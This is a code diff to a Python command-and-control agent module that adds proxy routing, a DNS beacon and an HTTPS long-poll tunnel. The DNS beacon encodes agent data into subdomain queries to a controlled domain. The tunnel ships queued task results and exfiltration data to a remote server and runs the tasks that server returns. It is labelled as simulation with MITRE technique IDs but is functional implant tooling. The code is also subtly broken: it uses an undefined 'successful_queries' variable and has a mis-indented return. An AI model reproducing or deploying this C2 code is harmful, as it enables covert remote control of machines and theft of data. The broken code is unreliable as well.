@@ -10,6 +10,13 @@ import uuid # For generating a unique agent ID
 import string
 import json
 
+# Import dnspython if available (for DNS C2 simulation)
+try:
+    import dns.resolver
+    import dns.exception
+except ImportError:
+    dns = None # Handle optional dependency
+
 class CommandControl:
     """Handles Command and Control operations, including C2 beaconing."""
 
@@ -22,10 +29,15 @@ class CommandControl:
             "beacon_timeout_seconds": 30, # Timeout for individual HTTP requests
             "max_beacon_attempts": 3, # Max consecutive failures before stopping beacon thread
             "include_task_results_in_beacon": True,
+            # Proxy settings (initially None)
+            "http_proxy_url": None, 
+            "https_proxy_url": None,
+            # Default value from core module config
             "modules": {"command_control": {"include_task_results_in_beacon": True}}
         }
         self.logger = logging.getLogger(__name__)
         self.beacon_threads: Dict[str, threading.Event] = {} # Store stop events for active beacons
+        self.tunnel_threads: Dict[str, threading.Event] = {} # Store stop events for active tunnels
         self.agent_id = str(uuid.uuid4()) # Generate a unique ID for this agent instance
         self.task_results_queue: List[Dict[str, Any]] = [] # Simple queue for results
         self.outgoing_exfil_queue: List[Dict[str, Any]] = [] # Dedicated queue for exfil data
@@ -34,30 +46,75 @@ class CommandControl:
 
     def update_config(self, config: Dict[str, Any]):
         """Update internal config with loaded configuration."""
-        self.config.update(config.get("command_control", {}))
+        # Load general C2 config first
+        c2_config = config.get("command_control", {})
+        self.config.update(c2_config)
+        
+        # Load specific module config if it exists (might override general)
+        module_specific_config = config.get("modules", {}).get("command_control", {})
+        self.config.update(module_specific_config)
+        
+        # Explicitly update proxy settings from the loaded config
+        self.config["http_proxy_url"] = self.config.get("http_proxy_url")
+        self.config["https_proxy_url"] = self.config.get("https_proxy_url")
+        
         self.logger.info("CommandControl module configuration updated.")
+        self.logger.debug(f"C2 Proxy Config: HTTP='{self.config['http_proxy_url']}', HTTPS='{self.config['https_proxy_url']}'")
+
+    def _handle_proxy_config(self, details: Dict[str, Any]) -> Dict[str, Any]:
+        """Updates the proxy configuration for subsequent C2 communications."""
+        http_proxy = details.get("http_proxy_url")
+        https_proxy = details.get("https_proxy_url")
+        # You could add support for proxy type (SOCKS4/5) and auth later if needed
+        # For now, we assume standard HTTP/HTTPS proxy URLs
+        
+        updated = False
+        if http_proxy is not None:
+            self.config["http_proxy_url"] = http_proxy if http_proxy else None # Allow setting back to None
+            self.logger.info(f"Set HTTP proxy for C2 to: {self.config['http_proxy_url']}")
+            updated = True
+        if https_proxy is not None:
+            self.config["https_proxy_url"] = https_proxy if https_proxy else None # Allow setting back to None
+            self.logger.info(f"Set HTTPS proxy for C2 to: {self.config['https_proxy_url']}")
+            updated = True
+            
+        if not updated:
+             return {"status": "no_op", "reason": "No proxy URLs provided in details.", "operation": "configure_proxy"}
+             
+        # Proxies will be applied on the next beacon request by _beacon_worker
+        return {"status": "success", "message": "C2 proxy configuration updated.", "operation": "configure_proxy"}
 
     def run_operation(self, data: Dict[str, Any]) -> Dict[str, Any]:
         """Route C2 operation requests to appropriate handlers."""
         operation_type = data.get("operation")
         details = data.get("details", {})
         
+        # Add original operation type to details for context
+        details['_original_operation_type'] = operation_type 
+        
         handler_map = {
             "start_http_beacon": self._handle_http_beacon,
             "stop_http_beacon": self._handle_stop_beacon,
-            # Deprecated/Simulated handlers
-            "proxy_c2": self._handle_not_implemented,
-            "tunnel_c2": self._handle_not_implemented,
-            "proxy": self._handle_not_implemented, # Handle legacy technique name
-            "tunnel": self._handle_not_implemented, # Handle legacy technique name
+            "configure_proxy": self._handle_proxy_config,
+            "proxy_c2": self._handle_proxy_config, 
+            "proxy": self._handle_proxy_config,
+            "dns_c2": self._handle_dns_c2_beacon, # Added DNS C2 handler
+            
+            # Other placeholders remain not implemented
+            "tunnel_c2": self._start_https_long_poll_tunnel, # Map to new handler
+            "tunnel": self._start_https_long_poll_tunnel, # Alias for convenience
+            "stop_tunnel": self._handle_stop_tunnel, # Add stop handler
+            "custom_protocol_c2": self._handle_not_implemented,
+            "fallback_channels": self._handle_not_implemented, 
+            "dynamic_resolution": self._handle_not_implemented 
         }
         
         handler = handler_map.get(operation_type)
         
         if handler:
             try:
+                # Pass details to the handler
                 result = handler(details)
-                # If starting a beacon, status reflects thread start success, not beacon success itself
                 return result 
             except Exception as e:
                 self.logger.error(f"Error during C2 operation '{operation_type}': {e}", exc_info=True)
@@ -82,12 +139,12 @@ class CommandControl:
         user_agent = details.get("user_agent", self.config["default_user_agent"])
         method = details.get("method", self.config["default_http_method"]).upper()
         additional_headers = details.get("headers", {})
-        verify_ssl = details.get("verify_ssl", True) # Allow disabling SSL verification for testing
+        verify_ssl = details.get("verify_ssl", True)
         timeout = self.config["beacon_timeout_seconds"]
         max_failures = self.config["max_beacon_attempts"]
         failure_count = 0
         include_results = self.config.get("include_task_results_in_beacon", True)
-        include_exfil = True # Always try to include queued exfil data
+        include_exfil = True
 
         if not c2_url:
             self.logger.error(f"[Beacon {beacon_id}] C2 URL not provided. Stopping worker.")
@@ -100,7 +157,7 @@ class CommandControl:
         headers = {"User-Agent": user_agent, "X-Agent-ID": self.agent_id}
         headers.update(additional_headers)
 
-        self.logger.info(f"[Beacon {beacon_id}] Starting beacon thread. Target: {c2_url}, Interval: {interval}s, Jitter: {jitter}%")
+        self.logger.info(f"[Beacon {beacon_id}] Starting. Target: {c2_url}, Interval: {interval}s, Jitter: {jitter}%")
 
         while not stop_event.is_set():
             try:
@@ -129,15 +186,28 @@ class CommandControl:
                         self.logger.debug(f"[Beacon {beacon_id}] Including {len(beacon_data['exfil_data'])} exfil chunks.")
                 # --- End Prepare Data --- 
 
+                # --- Prepare Proxies --- 
+                proxies = {}
+                http_proxy = self.config.get("http_proxy_url")
+                https_proxy = self.config.get("https_proxy_url")
+                if http_proxy:
+                    proxies['http'] = http_proxy
+                if https_proxy:
+                    proxies['https'] = https_proxy
+                if proxies:
+                     self.logger.debug(f"[Beacon {beacon_id}] Using proxies: {proxies}")
+                # --- End Prepare Proxies --- 
+
                 # Send request
                 self.logger.debug(f"[Beacon {beacon_id}] Sending {method} beacon to {c2_url}")
                 response = None
-                task_to_execute = None # Variable to hold received task
+                task_to_execute = None
                 start_time = time.time()
                 try:
                     if method == "POST":
                         response = requests.post(c2_url, headers=headers, json=beacon_data, 
-                                                 timeout=timeout, verify=verify_ssl)
+                                                 timeout=timeout, verify=verify_ssl, 
+                                                 proxies=proxies)
                     else: # GET
                         # GET requests with large payloads (results/exfil) are problematic
                         # Consider switching to POST if exfil/results are expected
@@ -152,7 +222,8 @@ class CommandControl:
                                   except Exception: get_params[k] = str(v)[:1000] # Limit length if cannot encode
                              else: get_params[k] = v
                         response = requests.get(c2_url, headers=headers, params=get_params, 
-                                                timeout=timeout, verify=verify_ssl)
+                                                timeout=timeout, verify=verify_ssl, 
+                                                proxies=proxies)
                     
                     response.raise_for_status() # Raise exception for bad status codes (4xx or 5xx)
                     
@@ -282,27 +353,289 @@ class CommandControl:
             self._handle_stop_beacon({"beacon_id": beacon_id})
         self.logger.info("All active beacon threads signaled to stop.")
 
-    def _handle_not_implemented(self, details: Dict[str, Any]) -> Dict[str, Any]:
-         """Placeholder for techniques not yet realistically implemented."""
-         # Infer technique name from calling function
-         import inspect
-         try:
-              technique_name = inspect.currentframe().f_back.f_code.co_name.replace("_handle_", "")
-         except Exception:
-              technique_name = "unknown"
-              
-         self.logger.warning(f"C2 technique '{technique_name}' is not yet implemented with realistic actions.")
-         return {
-             "status": "skipped", 
-             "message": f"Technique '{technique_name}' not realistically implemented.",
-             "technique": technique_name,
-             "timestamp": datetime.now().isoformat(),
-             "details": details
-         }
+    def _handle_dns_c2_beacon(self, details: Dict[str, Any]) -> Dict[str, Any]:
+        """Simulates sending a C2 beacon via DNS query."""
+        if not dns:
+            return {"status": "error", "reason": "dnspython library not installed. Cannot use DNS C2."}
 
-    # Deprecated simulation handlers - redirect to not implemented
-    def _handle_proxy(self, data: Dict[str, Any]) -> Dict[str, Any]: return self._handle_not_implemented(data)
-    def _handle_tunnel(self, data: Dict[str, Any]) -> Dict[str, Any]: return self._handle_not_implemented(data)
+        controlled_domain = details.get("controlled_domain")
+        beacon_data_str = details.get("beacon_data", f"agent={self.agent_id}_status=ok") # Example simple data
+        query_type = details.get("query_type", "A").upper()
+        max_label_len = details.get("max_label_length", 60)
+        mitre_id = "T1071.004" # Application Layer Protocol: DNS
+        mitre_name = "Command and Control: Application Layer Protocol: DNS"
+
+        if not controlled_domain:
+            return {"status": "error", "reason": "Missing 'controlled_domain' for dns_c2."}
+        
+        status = "failure"
+        reason = ""
+        queries_sent = 0
+        result_details = {
+             "controlled_domain": controlled_domain,
+             "query_type": query_type,
+             "beacon_data_snippet": beacon_data_str[:100] + ("..." if len(beacon_data_str) > 100 else ""),
+             "fqdn_generated": None,
+             "query_status": None
+        }
+
+        self.logger.info(f"Simulating DNS C2 beacon to {controlled_domain}")
+
+        try:
+            # Encode data (Base32 suitable for DNS)
+            encoded_data = base64.b32encode(beacon_data_str.encode()).decode('ascii').rstrip('=')
+            
+            # Truncate/chunk if needed (simple truncation for this simulation)
+            if len(encoded_data) > max_label_len:
+                self.logger.warning(f"Encoded data ({len(encoded_data)} chars) longer than max label length ({max_label_len}). Truncating.")
+                encoded_data = encoded_data[:max_label_len]
+                
+            # Construct FQDN
+            fqdn = f"{encoded_data}.{controlled_domain}"
+            result_details["fqdn_generated"] = fqdn
+            
+            if len(fqdn) > 253 or any(len(label) > 63 for label in fqdn.split('.')):
+                 raise ValueError(f"Generated FQDN is invalid or too long: {fqdn[:100]}...")
+
+            # Perform DNS query (simulation - we don't expect a specific answer)
+            resolver = dns.resolver.Resolver()
+            resolver.timeout = details.get("dns_timeout", 2)
+            resolver.lifetime = details.get("dns_lifetime", 5)
+            self.logger.debug(f"Sending DNS query ({query_type}) for: {fqdn}")
+            
+            try:
+                 answers = resolver.resolve(fqdn, query_type, raise_on_no_answer=False)
+                 result_details["query_status"] = "Query sent (received response/no answer)"
+                 self.logger.info(f"Simulated DNS beacon sent. Query for {fqdn} completed.")
+                 successful_queries += 1
+            except dns.resolver.NXDOMAIN:
+                 result_details["query_status"] = "Query sent (NXDOMAIN received - expected for passive C2)"
+                 self.logger.info(f"Simulated DNS beacon sent. Query for {fqdn} received NXDOMAIN (expected)." )
+                 successful_queries += 1
+            except dns.exception.Timeout:
+                 reason = f"DNS query for {fqdn} timed out."
+                 result_details["query_status"] = "Timeout"
+                 self.logger.warning(reason)
+                 status = "failure"
+            except dns.exception.DNSException as dns_err:
+                 reason = f"DNS query for {fqdn} failed: {dns_err}"
+                 result_details["query_status"] = f"DNS Error: {dns_err}"
+                 self.logger.warning(reason)
+                 status = "failure"
+
+            if successful_queries > 0: 
+                 status = "success"
+                 reason = "DNS C2 beacon simulation query sent."
+                 
+        except ValueError as ve:
+             reason = f"Failed to construct valid DNS query: {ve}"
+             self.logger.error(reason)
+             result_details["error"] = reason
+             status = "error"
+        except Exception as e:
+            reason = f"Error during DNS C2 simulation: {e}"
+            self.logger.error(reason, exc_info=True)
+            result_details["error"] = str(e)
+            status = "error"
+
+        return {
+            "status": status,
+            "technique": "dns_c2_beacon_simulation",
+            "mitre_technique_id": mitre_id,
+            "mitre_technique_name": mitre_name,
+            "timestamp": datetime.now().isoformat(),
+            "details": result_details,
+            "reason": reason if status != "success" else None
+        }
+
+    def _https_long_poll_worker(self, tunnel_id: str, stop_event: threading.Event, details: Dict[str, Any]):
+        """Worker function for HTTPS long polling C2."""
+        target_url = details.get("target_url")
+        interval = details.get("interval_seconds", 5) # Time between polls *after* completion/error
+        jitter = details.get("jitter_percent", 10) # Jitter for interval
+        user_agent = details.get("user_agent", self.config["default_user_agent"])
+        additional_headers = details.get("headers", {})
+        verify_ssl = details.get("verify_ssl", True)
+        # Long poll timeout: how long agent waits for server response
+        # Server should ideally hold connection slightly less than this
+        poll_timeout = details.get("poll_timeout_seconds", 120) 
+        max_failures = self.config["max_beacon_attempts"] # Reuse beacon failure limit
+        failure_count = 0
+        include_results = self.config.get("include_task_results_in_beacon", True)
+        include_exfil = True
+
+        if not target_url:
+            self.logger.error(f"[Tunnel {tunnel_id}] Target URL not provided. Stopping worker.")
+            return
+        if interval <= 0: interval = 5
+        jitter = max(0, min(100, jitter)) 
+        poll_timeout = max(10, poll_timeout) # Ensure reasonable minimum poll time
+
+        headers = {"User-Agent": user_agent, "X-Agent-ID": self.agent_id}
+        headers.update(additional_headers)
+
+        self.logger.info(f"[Tunnel {tunnel_id}] Starting HTTPS Long Poll. Target: {target_url}, Poll Timeout: {poll_timeout}s")
+
+        while not stop_event.is_set():
+            task_to_execute = None
+            try:
+                # --- Prepare Data to Send --- 
+                post_data = {"agent_id": self.agent_id, "timestamp": datetime.now().isoformat(), "status": "polling"}
+                with self.queue_lock:
+                    if include_results and self.task_results_queue:
+                        post_data["results"] = self.task_results_queue[:]
+                        self.task_results_queue.clear()
+                        self.logger.debug(f"[Tunnel {tunnel_id}] Including {len(post_data['results'])} task results.")
+                    if include_exfil and self.outgoing_exfil_queue:
+                        post_data["exfil_data"] = self.outgoing_exfil_queue[:]
+                        self.outgoing_exfil_queue.clear()
+                        self.logger.debug(f"[Tunnel {tunnel_id}] Including {len(post_data['exfil_data'])} exfil chunks.")
+                # --- End Prepare Data ---
+
+                # --- Prepare Proxies --- 
+                proxies = {}
+                http_proxy = self.config.get("http_proxy_url")
+                https_proxy = self.config.get("https_proxy_url")
+                if http_proxy and target_url.startswith('http://'): proxies['http'] = http_proxy
+                if https_proxy and target_url.startswith('https://'): proxies['https'] = https_proxy
+                if proxies: self.logger.debug(f"[Tunnel {tunnel_id}] Using proxies: {proxies}")
+                # --- End Prepare Proxies --- 
+
+                # --- Make Long Poll Request --- 
+                self.logger.debug(f"[Tunnel {tunnel_id}] Sending POST poll request to {target_url} (timeout: {poll_timeout}s)")
+                start_time = time.time()
+                response = requests.post(target_url, headers=headers, json=post_data, 
+                                         timeout=poll_timeout, verify=verify_ssl,
+                                         proxies=proxies)
+                duration = time.time() - start_time
+                self.logger.debug(f"[Tunnel {tunnel_id}] Poll request completed in {duration:.3f}s (Status: {response.status_code})")
+                
+                response.raise_for_status() # Check for 4xx/5xx errors
+                failure_count = 0 # Reset failures on successful poll
+
+                # --- Process Response / Tasking --- 
+                try:
+                    if response.text and response.headers.get('content-type', '').startswith('application/json'):
+                        tasks = response.json()
+                        if isinstance(tasks, list) and tasks:
+                            task_to_execute = tasks[0] # Process first task
+                            self.logger.info(f"[Tunnel {tunnel_id}] Received task from C2: {task_to_execute}")
+                        elif isinstance(tasks, dict) and tasks: # Handle single task object
+                            task_to_execute = tasks
+                            self.logger.info(f"[Tunnel {tunnel_id}] Received task from C2: {task_to_execute}")
+                        else:
+                            self.logger.debug(f"[Tunnel {tunnel_id}] Poll response OK, but no tasks received.")
+                    else:
+                         self.logger.debug(f"[Tunnel {tunnel_id}] Poll response OK, empty or non-JSON response.")
+                except json.JSONDecodeError:
+                     self.logger.warning(f"[Tunnel {tunnel_id}] Failed to decode JSON response: {response.text[:100]}")
+                except Exception as task_err:
+                     self.logger.warning(f"[Tunnel {tunnel_id}] Error processing C2 response: {task_err}")
+                # --------------------------------
+                
+            except requests.exceptions.Timeout:
+                 self.logger.debug(f"[Tunnel {tunnel_id}] Poll request timed out after {poll_timeout}s (as expected if no tasks).")
+                 failure_count = 0 # Timeout is not necessarily an error in long polling
+            except requests.exceptions.RequestException as req_err:
+                 failure_count += 1
+                 self.logger.warning(f"[Tunnel {tunnel_id}] Poll request failed ({failure_count}/{max_failures}): {req_err}")
+                 if failure_count >= max_failures:
+                      self.logger.error(f"[Tunnel {tunnel_id}] Max poll failures reached ({max_failures}). Stopping tunnel.")
+                      stop_event.set()
+                 # Apply jittered interval sleep on failure before retrying
+                 jitter_amount = (interval * jitter / 100.0)
+                 sleep_time = interval + random.uniform(-jitter_amount, jitter_amount)
+                 sleep_time = max(0.1, sleep_time)
+                 stop_event.wait(timeout=sleep_time)
+            except Exception as e:
+                 failure_count += 1
+                 self.logger.error(f"[Tunnel {tunnel_id}] Unexpected error in poll worker ({failure_count}/{max_failures}): {e}", exc_info=True)
+                 if failure_count >= max_failures:
+                      self.logger.error(f"[Tunnel {tunnel_id}] Max poll failures reached due to unexpected error. Stopping tunnel.")
+                      stop_event.set()
+                 stop_event.wait(timeout=interval) # Basic sleep on unexpected error
+                 
+            # --- Execute Task if received --- 
+            if task_to_execute:
+                self._execute_received_task(task_to_execute)
+            # --------------------------------
+
+            # Apply short interval+jitter *only if* connection failed or task was processed
+            # Otherwise, loop immediately to poll again after success/timeout
+            if failure_count > 0 or task_to_execute:
+                if not stop_event.is_set():
+                     jitter_amount = (interval * jitter / 100.0)
+                     sleep_time = interval + random.uniform(-jitter_amount, jitter_amount)
+                     sleep_time = max(0.1, sleep_time)
+                     self.logger.debug(f"[Tunnel {tunnel_id}] Sleeping for {sleep_time:.2f}s before next poll.")
+                     stop_event.wait(timeout=sleep_time)
+            # If successful poll but no task, immediately poll again
+
+        self.logger.info(f"[Tunnel {tunnel_id}] HTTPS Long Poll worker thread stopped.")
+        if tunnel_id in self.tunnel_threads:
+             del self.tunnel_threads[tunnel_id]
+
+    def _start_https_long_poll_tunnel(self, details: Dict[str, Any]) -> Dict[str, Any]:
+        """Starts an HTTPS long polling C2 tunnel thread."""
+        tunnel_id = details.get("tunnel_id", f"tunnel_{self._generate_random_string(6)}")
+        target_url = details.get("target_url")
+        mitre_id = "T1572"
+        mitre_name = "Protocol Tunneling"
+
+        if not target_url or not target_url.startswith('https://'):
+            return {"status": "error", "message": "Missing or invalid (non-HTTPS) 'target_url' detail.", "operation": "start_tunnel"}
+
+        if tunnel_id in self.tunnel_threads:
+            self.logger.warning(f"Tunnel with ID '{tunnel_id}' is already running.")
+            return {"status": "skipped", "message": f"Tunnel '{tunnel_id}' already active.", "tunnel_id": tunnel_id}
+
+        self.logger.info(f"Received request to start HTTPS long poll tunnel: {tunnel_id}")
+        stop_event = threading.Event()
+        self.tunnel_threads[tunnel_id] = stop_event
+        
+        thread = threading.Thread(target=self._https_long_poll_worker, 
+                                  args=(tunnel_id, stop_event, details), 
+                                  daemon=True, name=f"Tunnel-{tunnel_id}") 
+        thread.start()
+        
+        self.logger.info(f"HTTPS long poll tunnel thread '{tunnel_id}' started.")
+        
+         return {
+            "status": "success",
+            "technique": "c2_https_long_poll",
+            "mitre_technique_id": mitre_id,
+            "mitre_technique_name": mitre_name,
+             "timestamp": datetime.now().isoformat(),
+            "details": {"tunnel_id": tunnel_id, "message": "HTTPS long poll tunnel started successfully."}
+        }
+
+    def _handle_stop_tunnel(self, details: Dict[str, Any]) -> Dict[str, Any]:
+        """Stops a specific running tunnel thread."""
+        tunnel_id = details.get("tunnel_id")
+
+        if not tunnel_id:
+            return {"status": "error", "message": "Missing 'tunnel_id' detail for stopping tunnel.", "operation": "stop_tunnel"}
+            
+        self.logger.info(f"Received request to stop tunnel: {tunnel_id}")
+        stop_event = self.tunnel_threads.get(tunnel_id)
+        
+        if stop_event:
+            stop_event.set() 
+            if tunnel_id in self.tunnel_threads:
+                 del self.tunnel_threads[tunnel_id] # Remove immediately
+            self.logger.info(f"Stop signal sent to tunnel thread: {tunnel_id}")
+            return {"status": "success", "message": f"Stop signal sent to tunnel '{tunnel_id}'.", "tunnel_id": tunnel_id}
+        else:
+            self.logger.warning(f"Tunnel thread '{tunnel_id}' not found or already stopped.")
+            return {"status": "skipped", "message": f"Tunnel '{tunnel_id}' not found or already stopped.", "tunnel_id": tunnel_id}
+
+    def _handle_not_implemented(self, details: Dict[str, Any]) -> Dict[str, Any]:
+        """Placeholder for not-yet-implemented C2 operations."""
+        op_type = details.get('_original_operation_type', 'Unknown')
+        reason = f"C2 technique '{op_type}' is not implemented."
+        self.logger.warning(reason)
+        # Return the original technique name if possible
+        return {"status": "not_implemented", "reason": reason, "operation": op_type}
             
     def _log_error(self, message: str, exc_info=False) -> None:
         """Log errors using the initialized logger."""
